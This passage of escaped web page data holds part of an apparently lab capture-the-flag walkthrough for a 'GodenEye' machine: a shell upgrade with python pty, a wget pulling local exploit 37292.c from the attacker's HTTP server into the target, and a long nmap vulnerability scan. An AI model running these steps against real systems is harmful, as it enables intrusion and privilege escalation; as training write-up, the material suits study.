__ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675913050473.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;step-7-privilege-escalation-1\&quot;&gt;Step-7 Privilege escalation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#step-7-privilege-escalation-1\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Turn shell to python shell&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python -c &#39;import pty; pty.spawn(\&quot;/bin/bash\&quot;)&#39; &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675914702007.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python3 -m http.server 5555&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;In the shell\n&lt;code&gt;wget http://192.168.124.5:5555/37292.c&lt;/code&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;enclosure\&quot;&gt;Enclosure&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#enclosure\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675329659408.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675329715883.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Not shown: 65531 closed tcp ports (reset)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PORT      STATE SERVICE&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;25/tcp    open  smtp&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;| smtp-vuln-cve2010-4344: &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|_  The SMTP server is not Exim: NOT VULNERABLE&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;| ssl-dh-params: &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   VULNERABLE:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     State: VULNERABLE&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       Transport Layer Security (TLS) services that use anonymous&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       Diffie-Hellman key exchange only provide protection against passive&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       eavesdropping, and are vulnerable to active man-in-the-middle attacks&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       which could completely compromise the confidentiality and integrity&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       of any data exchanged over the resulting session.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     Check results:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       ANONYMOUS DH GROUP 1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Type: Safe prime&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Source: Unknown/Custom-generated&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Length: 512&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Generator Length: 8&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Public Key Length: 512&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     References:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       https://www.ietf.org/rfc/rfc2246.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     State: VULNERABLE&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     IDs:  BID:74733  CVE:CVE-2015-4000&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       The Transport Layer Security (TLS) protocol contains a flaw that is&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       triggered when handling Diffie-Hellman key exchanges defined with&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       to downgrade the security of a TLS session to 512-bit export-grade&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       cryptography, which is significantly weaker, allowing the attacker&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       to more easily break the encryption and monitor or tamper with&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       the encrypted stream.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     Disclosure date: 2015-5-19&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     Check results:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       EXPORT-GRADE DH GROUP 1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Type: Safe prime&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Source: Unknown/Custom-generated&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Length: 512&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Generator Length: 8&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Public Key Length: 512&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     References:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       https://weakdh.org&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       https://www.securityfocus.com/bid/74733&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   Diffie-Hellman Key Exchange Insufficient Group Strength&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     State: VULNERABLE&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       Transport Layer Security (TLS) services that use Diffie-Hellman groups&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       of insufficient strength, especially those using one of a few commonly&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       shared groups, may be susceptible to passive eavesdropping attacks.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     Check results:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       WEAK DH GROUP 1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Type: Safe prime&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Source: postfix builtin&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Length: 1024&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Generator Length: 8&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Public Key Length: 1024&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     References:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|_      https://weakdh.org&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;| ssl-poodle: &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   VULNERABLE:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   SSL POODLE information leak&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     State: VULNERABLE&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     IDs:  BID:70574  CVE:CVE-2014-3566&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|           products, uses nondeterministic CBC padding, which makes it easier&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|           for man-in-the-middle attackers to obtain cleartext data via a&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|           padding-oracle attack, aka the \&quot;POODLE\&quot; issue.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     Disclosure date: 2014-10-14&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     Check results:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       TLS_RSA_WITH_AES_128_CBC_SHA&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     References:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       https://www.securityfocus.com/bid/70574&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       https://www.imperialviolet.org/2014/10/14/poodle.html&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       https://www.openssl.org/~bodo/ssl-poodle.pdf&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;80/tcp    open  http&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;| http-slowloris-check: &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   VULNERABLE:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   Slowloris DOS attack&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     State: LIKELY VULNERABLE&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     IDs:  CVE:CVE-2007-6750&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       Slowloris tries to keep many connections to the target web server open and hold&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       them open as long as possible.  It accomplishes this by opening connections to&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       the target web server and sending a partial request. By doing so, it starves&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       the http server&#39;s resources causing Denial Of Service.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     Disclosure date: 2009-09-17&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     References:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       http://ha.ckers.org/slowloris/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;55006/tcp open  unknown&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;| ssl-poodle: &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   VULNERABLE:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   SSL POODLE information leak&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     State: VULNERABLE&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     IDs:  BID:70574  CVE:CVE-2014-3566&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|           products, uses nondeterministic CBC padding, which makes it easier&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|           for man-in-the-middle attackers to obtain cleartext data via a&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|           padding-oracle attack, aka the \&quot;POODLE\&quot; issue.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     Disclosure date: 2014-10-14&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     Check results:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       TLS_RSA_WITH_AES_128_CBC_SHA&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     References:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       https://www.securityfocus.com/bid/70574&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       https://www.imperialviolet.org/2014/10/14/poodle.html&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       https://www.openssl.org/~bodo/ssl-poodle.pdf&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;| ssl-dh-params: &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   VULNERABLE:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|   Diffie-Hellman Key Exchange Insufficient Group Strength&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     State: VULNERABLE&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       Transport Layer Security (TLS) services that use Diffie-Hellman groups&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       of insufficient strength, especially those using one of a few commonly&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       shared groups, may be susceptible to passive eavesdropping attacks.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     Check results:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|       WEAK DH GROUP 1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Type: Safe prime&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Source: Unknown/Custom-generated&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Modulus Length: 1024&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Generator Length: 8&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|             Public Key Length: 1024&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|     References:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;|_      https://weakdh.org&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;55007/tcp open  unknown&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;MAC Address: 00:0C:29:8D:FC:67 (VMware)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Nmap done: 1 IP address (1 host up) scanned in 323.07 seconds&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;command-summary\&quot;&gt;Command Summary&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#command-summary\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;information-gathering&quot;],&quot;text&quot;:[0,&quot;Information gathering&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-1&quot;],&quot;text&quot;:[0,&quot;Method-1&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;step-1-intrude-the-login-pagefailed&quot;],&quot;text&quot;:[0,&quot;step-1 Intrude the login page(failed)&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;step-2-view-home-page-source&quot;],&quot;text&quot;:[0,&quot;step-2 View home page source.&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;step-3-pop3&quot;],&quot;text&quot;:[0,&quot;step-3 POP3&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;step-4-login-mailbox&quot;],&quot;text&quot;:[0,&quot;step-4 Login mailbox&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;step-5-login-in-gnocertdir&quot;],&quot;text&quot;:[0,&quot;step-5 Login in gnocertdir&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;step-6-moodlecms-exploitation&quot;],&quot;text&quot;:[0,&quot;step-6 Moodlecms exploitation&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;step-7-privilege-escalation&quot;],&quot;text&quot;:[0,&quot;Step-7 Privilege escalation&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-2-reverse-shell&quot;],&quot;text&quot;:[0,&quot;Method-2 Reverse shell&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;step-6-moodlecms-exploitation-1&quot;],&quot;text&quot;:[0,&quot;Step-6 Moodlecms exploitation&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;step-7-privilege-escalation-1&quot;],&quot;text&quot;:[0,&quot;Step-7 Privilege escalation&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;enclosure&quot;],&quot;text&quot;:[0,&quot;Enclosure&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;command-summary&quot;],&quot;text&quot;:[0,&quot;Command Summary&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/1675389865498.png&quot;],[0,&quot;img/1675389870691.png&quot;],[0,&quot;img/1675389847203.png&quot;],[0,&quot;img/1675390018821.png&quot;],[0,&quot;img/1675390162371.png&quot;],[0,&quot;img/1675390345344.png&quot;],[0,&quot;img/1675390355645.png&quot;],[0,&quot;img/1675390815369.png&quot;],[0,&quot;img/1675391828534.png&quot;],[0,&quot;img/1675391692695.png&quot;],[0,&quot;img/1675393082037.png&quot;],[0,&quot;img/1675394170762.png&quot;],[0,&quot;img/1675394314719.png&quot;],[0,&quot;img/1675394962917.png&quot;],[0,&quot;img/1675395021833.png&quot;],[0,&quot;img/1675395868856.png&quot;],[0,&quot;img/1675396334057.png&quot;],[0,&quot;img/1675396627851.png&quot;],[0,&quot;img/1675845464385.png&quot;],[0,&quot;img/1675905870571.png&quot;],[0,&quot;img/1675905558594.png&quot;],[0,&quot;img/1675906171442.png&quot;],[0,&quot;img/1675911223227.png&quot;],[0,&quot;img/1675912183070.png&quot;],[0,&quot;img/1675912534581.png&quot;],[0,&quot;img/1675912972431.png&quot;],[0,&quot;img/1675913050473.png&quot;],[0,&quot;img/1675914702007.png&quot;],[0,&quot;img/1675329659408.png&quot;],[0,&quot;img/1675329715883.png&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;GodenEye&quot;],&quot;date&quot;:[3,&quot;2023-02-08T03:01:48.000Z&quot;],&quot;categories&quot;:[0,&quot;Reproduction&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/1675389865498.png&quot;],[0,&quot;img/1675389870691.png&quot;],[0,&quot;img/1675389847203.png&quot;],[0,&quot;img/1675390018821.png&quot;],[0,&quot;img/1675390162371.png&quot;],[0,&quot;img/1675390345344.png&quot;],[0,&quot;img/1675390355645.png&quot;],[0,&quot;img/1675390815369.png&quot;],[0,&quot;img/1675391828534.png&quot;],[0,&quot;img/1675391692695.png&quot;],[0,&quot;img/1675393082037.png&quot;],[0,&quot;img/1675394170762.png&quot;],[0,&quot;img/1675394314719.png&quot;],[0,&quot;img/1675394962917.png&quot;],[0,&quot;img/1675395021833.png&quot;],[0,&quot;img/1675395868856.png&quot;],[0,&quot;img/1675396334057.png&quot;],[0,&quot;img/1675396627851.png&quot;],[0,&quot;img/1675845464385.png&quot;],[0,&quot;img/1675905870571.png&quot;],[0,&quot;img/1675905558594.png&quot;],[0,&quot;img/1675906171442.png&quot;],[0,&quot;img/1675911223227.png&quot;],[0,&quot;img/1675912183070.png&quot;],[0,&quot;img/1675912534581.png&quot;],[0,&quot;img/1675912972431.png&quot;],[0,&quot;img/1675913050473.png&quot;],[0,&quot;img/1675914702007